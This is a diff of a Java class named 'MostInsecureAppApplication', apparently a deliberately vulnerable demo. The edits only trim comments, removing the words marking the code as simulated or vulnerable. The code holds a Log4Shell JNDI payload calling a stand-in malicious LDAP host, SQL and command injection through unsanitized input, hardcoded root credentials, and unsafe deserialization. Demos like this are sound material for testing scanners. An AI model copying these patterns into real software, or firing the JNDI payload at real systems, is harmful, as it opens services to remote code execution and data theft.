@@ -43,17 +43,16 @@ public class MostInsecureAppApplication {
         }
     }
 
-    // Simulates a vulnerability like Log4Shell by logging unsanitized user input
+    // Log4Shell with unsanitized user input
     private static void simulateLog4Shell() {
         String userInput = "${jndi:ldap://malicious-server.com/exploit}";
         logger.info("User input: " + userInput);
     }
 
-    // Simulates SQL Injection by concatenating user input directly into a SQL query
+    // SQL injections
     private static void simulateSQLInjection(String userInput) {
         try (Connection connection = DriverManager.getConnection("jdbc:mysql://localhost:3306/test", "root", "password")) {
             Statement statement = connection.createStatement();
-            // Vulnerable to SQL injection
             String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
             ResultSet resultSet = statement.executeQuery(query);
             while (resultSet.next()) {
@@ -64,7 +63,7 @@ public class MostInsecureAppApplication {
         }
     }
 
-    // Simulates Deserialization of Untrusted Data
+    // Deserialization of Untrusted Data
     private static void simulateDeserialization() {
         try {
             // Assume we receive this from an untrusted source
@@ -77,7 +76,7 @@ public class MostInsecureAppApplication {
         }
     }
 
-    // Simulates Command Injection by using unsanitized user input in a command
+    // Injection using unsanitized user input in a command
     private static void simulateCommandInjection(String userInput) {
         try {
             // Vulnerable command injection
